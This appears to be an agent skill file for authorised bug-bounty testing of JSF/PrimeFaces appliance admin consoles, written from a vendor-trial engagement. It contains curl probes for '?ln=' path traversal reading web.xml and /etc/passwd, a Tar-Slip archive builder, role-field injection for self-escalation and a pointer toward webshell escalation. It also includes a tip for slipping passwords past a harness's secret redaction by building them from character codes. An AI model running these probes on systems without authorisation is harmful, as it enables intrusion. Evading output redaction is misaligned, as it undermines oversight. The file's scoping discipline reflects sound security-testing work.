---
name: hunt-jsf-primefaces
description: "Hunt JavaServer Faces + PrimeFaces enterprise appliance consoles (network access control, IPAM, billing panels, vendor management UIs). Covers: fixed-size generic error page fingerprinting so you stop counting 404s as '200 OK endpoints', endpoint discovery from iframe srcs and recorded network traffic instead of guessing paths, javax.faces.resource ?ln= traversal / LFI, ViewState handling, iframe-dialog login steps (OTP / first-access / IP-allowlist), hidden forceLogin checkboxes, RBAC differential matrices between two roles, render-vs-write licensing gates, and JSESSIONID vs secondary-session-cookie privilege confusion. Use when a target serves /faces/*.xhtml, exposes javax.faces.ViewState, references primefaces resource URLs, or is a vendor appliance console you can self-provision a trial instance of."
sources: live_engagement, vendor_security_advisories
report_count: 0
---

# Hunt: JSF / PrimeFaces enterprise consoles

Vendor appliances (NAC, IPAM, ITSM, billing, backup, VPN management) very often ship a Java
backend with a JSF + PrimeFaces admin console. These consoles are high-value: they are the
actual product, they run as root/system, and they were usually built before modern authz
discipline. They also punish sloppy recon harder than any other stack, because **every wrong
path returns the same HTTP 200 error page** — so the first job is learning to read the
fingerprint before you read the status code.

**Worked example with real numbers:** `references/genian-nac-case-study.md` — a full
JSF/PrimeFaces NAC console engagement: error-page markers, the traffic-derived endpoint map,
`?ln=` results, the five login gates, the two-role permission matrix, the force-enable-then-reload
licence test, and the trial-provisioning parameter trap. Read it when you need a concrete pattern
to copy.

## 1. Fingerprint

| Signal | Meaning |
|---|---|
| `/faces/*.xhtml`, `mainFrame.xhtml`, `adminlogin.xhtml` | JSF web tier |
| `javax.faces.ViewState` hidden input | JSF (Mojarra / MyFaces) |
| `/faces/javax.faces.resource/...?ln=primefaces&v=8.0` | PrimeFaces + version |
| `ui-tabs`, `ui-dialog`, `ui-datatable`, `ui-growl` classes | PrimeFaces widgets |
| `form1:fieldName` id/name convention | vendor-generated JSF form |
| `?ln=<library>` on resource URLs | this is the LFI surface, see §4 |

Version probe via REST when present (example shape):
`GET /mc2/rest/information/version/nac` -> `{"value":"NAC-CLOUD-R-154085-5.0.92.1022"}`

**Compare the build number against every vendor advisory before hunting.** Rev 154085 already
sat above all three published fix revisions on this engagement, so the entire known-CVE set was
duplicate-by-construction. Doing this first saves days.

## 2. The error-page size trap (read this before you enumerate)

JSF apps typically catch every exception and render one generic page:
*"System Message — An error has occurred. Please contact your system administrator."*
It is served with **HTTP 200**.

So a path sweep returns a wall of `200` and it is all lies. Measure the body size once and
treat it as the universal NOT-FOUND marker:

```bash
S=https://host
# pick an obviously nonexistent path to learn the marker
curl -sk -o /dev/null -w '%{size_download}\n' "$S/mc2/faces/zzz-does-not-exist.xhtml"
# -> e.g. 1109   (also seen: 1056, 2655 depending on app)
```

Then classify every probe by size, never by status:

```bash
probe() { curl -sk --max-time 12 -o /tmp/p -w '%{http_code}|%{size_download}' "$1"; }
for p in /faces/system/tools.xhtml /faces/manage/node.xhtml ...; do
  m=$(probe "$S$p"); size=${m#*|}
  case "$size" in 1109|1056|2655) echo "$p -> ABSENT";; *) echo "$p -> REAL ($m)";; esac
done
```

Guessing page names produced 25 "200 OK" hits that were all the same 1109-byte error page.
A wrong conclusion here ("25 admin pages exposed!") is the single most likely way to waste this
engagement and to file a garbage report.

## 3. Endpoint discovery that actually works

Do not guess filenames. Harvest them:

1. **`iframe src` / `frame src`** of the shell page — sub-app entry points live there
   (`mainIframe` -> `/faces/dashboard/frame.xhtml`).
2. **Record every request while clicking through the authenticated UI.** This is the highest
   yield step by far:
   ```python
   reqs = []
   page.on("request", lambda r: reqs.append((r.method, r.url,
       r.post_data[:200] if r.post_data else ""))
       if (".xhtml" in r.url or "/rest/" in r.url) else None)
   ```
   Then walk the top menus and every left-nav anchor; the unique `.xhtml` + `/rest/` set is
   your real map (obtained ~45 pages and 11 REST endpoints this way after guessing failed).
3. **Menu trees load async** — the tree page may be an empty shell whose items arrive via REST.
   Record the XHR rather than parsing the DOM.
4. **Task menus disclose write operations.** A "Tasks" dropdown lists Create/Delete/Edit even
   when the role cannot use them; it maps the intended write surface cheaply.
5. **The captive portal is a separate JSF app** (`/cwp2/` alongside `/mc2/`) and it is the
   pre-auth surface — the one users reach before any login. Every page 302s to
   `sessExpired.xhtml` until a real portal session token exists, and that token is minted by the
   **network sensor** when it redirects a device. So pre-auth portal pages are unreachable
   without a sensor/portal lab: record that as a **blocker, not coverage**. Useful probe:
   `/agent` chains to `/cwp2/faces/frontpage.xhtml?cmd=agentDownload`, and varying `cmd=`
   reveals which portal flows exist even when you cannot open them.

## 4. Resource `?ln=` traversal / LFI

The JSF resource handler resolves `name` inside a library directory (`?ln=<lib>`). If it fails to
normalise, you get arbitrary read.

```bash
B="$S/mc2/faces/javax.faces.resource"
# baseline: a real asset must return real bytes
curl -sk -w '%{size_download} %{content_type}\n' "$B/pages/adminlogin.css?ln=css"
#   -> 4541 text/css      <-- MUST work before you believe a negative
# then traverse
curl -sk -w '%{size_download}\n' "$B/adminlogin.css?ln=../../WEB-INF"
curl -sk -w '%{size_download}\n' "$B/adminlogin.css?ln=..%2f..%2fWEB-INF"
curl -sk -w '%{size_download}\n' "$B/..%2F..%2FWEB-INF%2Fweb.xml"
curl -sk -w '%{size_download}\n' "$B/%2Fetc%2Fpasswd?ln=css"
```

Verdict rule: traversal attempts returning the **error-page marker** (1109) or HTTP 400 mean
blocked. Getting `web.xml` or `/etc/passwd` content means Critical. Never call this positive
without reading the actual file body.

## 4b. Archive import = Slip class (and the sibling-component dedup argument)

Any "import design / theme / template / config / bundle" feature accepting `tgz|gz|zip` is a
Tar-Slip / Zip-Slip candidate. **Check the vendor advisories first.** If they already shipped a
Zip-Slip fix in a *different* component (agent upgrade, patch bundle), the import UI is the
sibling-component variant and is therefore **not a duplicate** — that framing is what makes it
reportable rather than lazy re-testing.

Probe archive: one normal entry plus traversal entries, benign content, one unique marker.

```python
with tarfile.open(out, "w:gz") as t:
    t.addfile(tarfile.TarInfo("design/index.html"), io.BytesIO(b"benign\n"))
    for name in ("../../<marker>.txt", "../../../../../../tmp/<marker>.txt"):
        info = tarfile.TarInfo(name); info.size = len(body)
        t.addfile(info, io.BytesIO(body))
```

After the import, hunt the marker under every web root (`/`, `/mc2/`, `/mc2/upload/`,
`/mc2/faces/`, `/mc2/resources/`, the portal app root).

**Critical discipline:** if the import errors out on your malformed payload, the test is
**UNPROVEN — not negative.** You never reached the extraction code. Obtain a known-good archive
from the matching Export function first. If Export is unavailable (read-only template set, no
row checkboxes, Tasks menu without Export), record the blocker and move on — never write
"archive import tested, secure". That sentence has no evidence behind it.

## 5. PrimeFaces mechanics in Playwright

```python
# (a) JSF polling prevents networkidle -> ALWAYS use domcontentloaded
await page.goto(url, wait_until="domcontentloaded", timeout=60000)
await page.wait_for_timeout(7000)

# (b) colons in ids must be CSS-escaped
await page.fill("#form1\\:userId", user)
await page.fill("#form1\\:passwd", pw)
await page.click("#form1\\:dologin")

# (c) accept native dialogs or the flow stalls
page.on("dialog", lambda d: asyncio.ensure_future(d.accept()))

# (d) modal/popup steps are IFRAMES, not DOM nodes on the parent page
for f in page.frames:
    if "otpAuthDlg" in f.url:      # also: allowIpDlg, *Dlg, editViewDlg
        await f.fill("#form1\\:fldCheckAuthNumber", code)
        await f.click("#form1\\:actionBtn")

# (e) a button can be present-but-disabled; PrimeFaces tabs stay disabled until
#     the prior step validates server-side
```

When a click reports *"subtree intercepts pointer events"*, an overlay dialog is blocking —
either fill/close the iframe dialog (§6) or `page.evaluate` a direct `.click()`.

### 5b. PrimeFaces inlines its validation config — read it instead of guessing

`PrimeFaces.cw("<widget>", ...)` prints the real constraints in the page source:

```
PrimeFaces.cw("FileUpload","widget_form1_fileUpload1",{id:"form1:fileUpload1",
  fileLimit:1, invalidFileMessage:"The file format is not valid.",
  allowTypes:/(\.|\/)(tgz|TGZ|gz|GZ)$/});
```

`allowTypes` / `fileLimit` / `sizeLimit` enforced in JS only ⇒ the server may accept any
content or size. That is the entire upload-filter-bypass surface, handed over for free —
grep `PrimeFaces.cw(` on every console page you load.

**Then invoke the upload through the widget, not the button.** The visible
`button.ui-fileupload-upload` is usually `display:none` (CSS in the page hides it, because the
vendor's own flow calls it from JS). Playing whack-a-mole with `click()`, `force=True`, or
`disabled=false` just times out. Call the API:

```python
await frame.set_input_files("#form1\\:fileUpload1_input", archive)
await frame.evaluate("() => PF('widget_form1_fileUpload1').upload()")
```

The server-side gate is observable and it is **not** the HTTP status:

```python
hid = await frame.evaluate(
    "() => document.querySelector('#form1\\\\:hidUploadComplete')?.value")
# "true"  -> upload accepted, parent form is now safe to submit (btnUpgrade / form.submit())
# "false" -> server REFUSED the file; extraction code was never reached
```

`hidUploadComplete === "false"` after a completed upload means **you did not get past validation** —
so any traversal marker you planted was never written. That is the difference between
"Tar-Slip tested, negative" (false claim) and "validation refused at upload, UNPROVEN" (honest).
Also expect vendor i18n defects here: a missing key renders as
`!! key mc.setup.cwpDesign.import.errorMsg not found !!` instead of a real message — read that as
"rejected", not as "the app crashed somewhere interesting".

### 5c. Component binding: NOT RENDERED ≠ RENDERED-BUT-DISABLED

The most mis-read mechanic on this stack, and the two cases need opposite conclusions:

| Server did | On postback | Verdict |
|---|---|---|
| left the component out of the view entirely | the clientId is **not bound** — a hidden input with that name is silently dropped | injecting the field proves nothing; **do not report** |
| rendered it `disabled` / `readonly` | value **is** bound; only client-side filtering stops you | run the write-then-reload test (§8) |

Verify rather than reason: as the low-priv role open your **own** user/admin record, add a
hidden input named for the role component (`form1:userTabView:lbxAdminRole=superAdmin`),
submit, reload, re-read the role. On a healthy build the POST body does not even contain the
field (PrimeFaces posts only registered components) and the role is unchanged — that is the
negative, with evidence.

### 5d. Automation pitfalls that cost real hours

- **`/tmp` is not shared** between `terminal` and `execute_code` on Windows. Write and read via
  `/home/agentuser/...` absolute paths on both sides, or the file vanishes mid-run.
- **Secret redaction mangles literals** — a password written literally into a generated script
  can come back as `***`, and the script then fails to parse. Build such constants from codes
  (`"".join(chr(c) for c in [64,66,108,...])`) or load them from a JSON file.
- **Wait out the TOTP window** before submitting: `rem = 30 - int(time.time()) % 30;` if
  `rem < 8`, sleep `rem+2` s — otherwise the code expires between fill and click.
- **A control can be `display:inline-block; visibility:visible` and still be 0-size.** Check
  `offsetParent`/dimensions before concluding it is hidden; a real `.click()` often works where
  setting `.checked = true` in JS does not stick.

## 6. Login-flow bypass matrix

Enterprise consoles stack several gate steps after the password. Test each independently; several
turn out to be client-side or default-permissive.

| Step | Observation | Verdict rule |
|---|---|---|
| `forceLogin` checkbox ("Disconnect all previous connections") | hidden/unticked; login fails with *"account is already in use by device with IP X"* | tick it; if that alone lets you in, note it (concurrent-session control is weak but often by design) |
| First-access / "Allowable IP Settings" iframe dialog | submits **empty** and proceeds | check whether an allowlist exists at all. `Number of Auth IPs = 0` ⇒ nothing breached ⇒ NOT a bug |
| MFA enrolment prompt | offers *"Continue without two-step verification"* | only a finding if an instance-level "require MFA" policy exists. Per-user opt-in ⇒ by design |
| OTP dialog | iframe, no skip control | mandatory; solve with your own TOTP (§ hunt-mfa-bypass `skills/hunt-mfa-bypass/scripts/totp_from_qr.py`) |

With a TOTP secret you control, sign in as your own test accounts indefinitely — never rely on
operator-supplied 30-second codes.

## 7. RBAC differential matrix (the core authz test)

Two roles, same instance, compare systematically. This converts "looks restricted" into numbers.

```bash
# 1) permission map lives in a session endpoint (shape varies)
curl -sk "$S/mc2/rest/sessions/current" -H "Cookie: $ADMIN_JAR"
#   -> {"permLevelMap":{"fullControl":20,"edit":10,"addEdit":15,"readOnly":5,"noPerm":0},
#       "adminPermMap":{"setup_config":20,"mgmt_user":20,...}}

# 2) repeat with the low-priv role and diff the maps
#    admin 20 across 30 keys | auditor 5 everywhere except setup_config=0, X=0, Y=0
```

Then request each page as both roles and tabulate `status:size`:

| Page | Admin | Low-priv |
|---|---|---|
| admin-only page (perm 0) | 200 / 61 KB | **302 -> error.xhtml** = enforced |
| readOnly page (perm 5) | 200 / 28 KB | 200 / 28 KB = allowed read |
| heavy page | 200 / 119 KB | 200 / **25 KB** = allowed but truncated |

Interpretation: `302 -> error.xhtml` (or error-page size) means the server enforced the
permission. Equal-size 200 on a perm-0 page means the check is missing → real escalation.

**Create the low-priv role yourself** via the user wizard instead of borrowing one. The role
option list (`auditor`, `ipAppManager`, `superAdmin`, …) then maps the entire privilege ladder
for free, and testing against an account you made is safe. Point the write attempts at that
account's **own** user record — that is where a binding gap would let it promote itself, and it
touches no third party. Anything that requires a *foreign* subject (another tenant's record, a
`subscription_id` you do not own) is a proof you must not buy with third-party data: mark it
UNPROVEN and say so, rather than testing it.

## 8. Render ≠ write: never report a page-level gate

A licensing/edition gate that says *"This feature requires Enterprise edition or later"* can
still render the page in full on a lower edition — with the fields present but `disabled`.
Rendering is not access. Prove persistence instead:

1. Read a field value (`NCTIME_IPCHANGE = 3`).
2. `e.removeAttribute('disabled'); e.value = 5`.
3. Submit (JS `.click()` when overlays intercept).
4. **Reload the page from the server** and re-read the field.

Still `3` ⇒ the server refused ⇒ **gate is correctly enforced server-side ⇒ NOT a bug.**
Only report if the new value survives reload. Always run this 3× before writing anything up.

Re-runnable: `scripts/force_enable_gate_test.py` does the whole cycle (baseline → force-enable →
submit → reload → verdict, plus `--revert` to clean up your own instance) and prints
KEPT / REVERTED / UNCLEAR so the call is not a judgement call.

```bash
python scripts/force_enable_gate_test.py \
  --url "https://host/mc2/faces/setup/configMgmt.xhtml" --state nac_admin_state.json \
  --field '#form1\:NCTIME_IPCHANGE' --value 5 --submit '#form1\:actionBtn' \
  --repeat 3 --revert --out gate_result.json
```

Corollary: a UI that merely hides things with `disabled` while still serving the values is
information exposure of "extremely minimal attack value" — most programs exclude it outright.

## 9. Session-cookie confusion

JSF consoles often carry two identifiers: `JSESSIONID` plus a secondary app cookie
(e.g. `mc.sessionId`). Test which one is authoritative by cross-pairing them:

| Cookie pair | Expected if secure |
|---|---|
| admin JSESSIONID + admin secondary | 200 |
| low-priv JSESSIONID + low-priv secondary | 302 denied |
| **low-priv JSESSIONID + admin secondary** | **302 denied** (session is authoritative) |
| admin JSESSIONID + low-priv secondary | 200 (still the admin's own session) |

If the third row returns 200, privilege confusion exists. On a healthy build it 302s and
`/sessions/current` still reports the low-priv permission map — that is the negative with proof.

## 10. Getting an in-scope instance to test on

Appliance vendors usually run a cloud console with self-service trials. Use it: a provisioned
trial is **the vendor's own infrastructure**, so it is in scope, and it hands you the real
product rather than a demo shop.

Look for the provisioning AJAX (WP `admin-ajax.php` in this engagement) and read the JS to learn
the parameter contract — the value sent is often the short product code (`nac`, `nac6`), not the
numeric plan id used by the lookup call. Getting that wrong yields a blanket
`{"result":false,"message":"invalid access"}` that looks like a security block and is really a
malformed request.

Then run the **differential** properly, because client-supplied quota fields are usually ignored:

| Requested | Provisioned | Conclusion |
|---|---|---|
| `nodes=10` | 300 (plan default) | client value ignored |
| `validityperiod=3650` | 30 days (plan default) | client value ignored |
| `nodes=99999`, 2nd trial | "maximum number of trial versions exceeded (1)" | quota enforced, 1/account |

Requesting a manipulated value and *also* a legitimate value, and seeing both succeed with the
same defaults, is what proves "server ignores client input" rather than "server blocked me".

## 10b. REST is a different auth plane from the console session

Documented REST paths (`/mc2/rest/{resource}`) normally take an **API key query param**
(`?apiKey={...}`), not the `JSESSIONID` cookie. A session-authenticated request to a REST path
returning the generic error page means *wrong auth type*, not *no endpoint* — read the vendor's
REST guide for the real base path before drawing any conclusion. Guessing the wrong prefix
(`/rest/nac/nodes` when the documented path is `/rest/nodes`) produces a page of identical
error responses that looks like "REST is locked down" and is actually "you used the wrong URL".

On cloud-hosted editions the API key is frequently minted by the **SaaS control plane**, not the
appliance: the Generate button is `disabled` for *every* account including the main admin, and
the panel reads "Synchronized & Not Editable" with `hidHasApiKey=false`. That is design, not a
gate you can beat — stop pushing it and test the control plane instead.

And again: licence/edition is often enforced only on the **specific gated field set**, not the
whole page. A System Config page can render in full on a lower edition (all fields present, a
subset `disabled`, live values readable) while every write still reverts (§8). Render is not
access; only persistence after reload is.

## Minimum 5 probes (do not write N/A without these)

| # | Probe | Why first |
|---|---|---|
| 1 | Measure the error-page size, then re-classify every "200" | Stops the entire engagement from being built on fake endpoints |
| 2 | Harvest endpoints from iframe srcs + recorded network, not guesses | Correct map, fast |
| 3 | `?ln=` traversal with a working baseline asset first | LFI is the highest-severity cheap win here |
| 4 | Two-role page matrix with permission-map diff | The real authz test |
| 5 | Write-then-reload on every gated form | Separates render from access |
| 6 | Self-escalate: low-priv role, **own** record, injected role field, reload | The one test that separates a UI gate from a binding gap |
| 7 | Read every `PrimeFaces.cw(...)` config for `allowTypes` / limits / size | Server-side filter-bypass surface, for free |
| 8 | Diff the live build number against every vendor advisory fixed-revision | Kills the duplicate CVE set before you spend a day on it |
| 9 | Session-cookie cross-pairing (§9) | Cheapest authz-confusion test on this stack |

## Gate 0 validation

1. **What can an attacker do right now?** Show the response that proves it — a file body, another
   tenant's record, or a write that survived a reload.
2. **What is lost?** Point at the data or the capability, not the page title.
3. **Reproducible in 10 minutes from zero?** Two accounts you own, one script.

Status codes are not evidence. The error-page marker makes a status-only claim actively wrong.

## Escalation (do not stop at this skill)

**Primitive:** authenticated or pre-auth access to an appliance admin surface

**Techniques:** `?ln=` LFI · RBAC gap on a perm-0 page · write accepted on a read-only role ·
edition/licence gate bypassed

**Escalate to:** `hunt-auth-bypass` · `hunt-ato` · `hunt-rce` (LFI -> file read -> webshell on
appliance) · `hunt-source-leak` · `exploit-depth`

Every finding must name the next link or state why the primitive is exhausted.

## Related skills

- **`hunt-mfa-bypass`** — the OTP/iframe/enrolment steps here feed directly into its patterns 4
  and 8; `skills/hunt-mfa-bypass/scripts/totp_from_qr.py` there gives you unlimited codes for your own test accounts.
- **`hunt-saml`** — appliance consoles frequently front the SSO with Keycloak+php-saml; that
  skill carries the one-time-use assertion harness discipline.
- **`triage-validation`** — run the Pre-Severity Gate before calling a rendered-but-disabled page
  a licence bypass.
- **`report-gotchas`** — "page rendered" and "endpoint returned 200" are the two claims this
  stack makes most tempting and least defensible.
- **`security-arsenal`** — payload catalog for `?ln=` traversal encodings and JSF/PrimeFaces
  CVE probes.

## Severity anchors

| Observation | Severity |
|---|---|
| `?ln=` traversal returning `web.xml` / `/etc/passwd` | Critical |
| Low-priv role writes on a perm-0 page, value survives reload | High |
| Unauthenticated REST on the appliance returning tenant/device data | High |
| Gated page renders but every write is refused server-side | **Not a finding** |
| Error-page 200s counted as "exposed admin pages" | **Not a finding** |
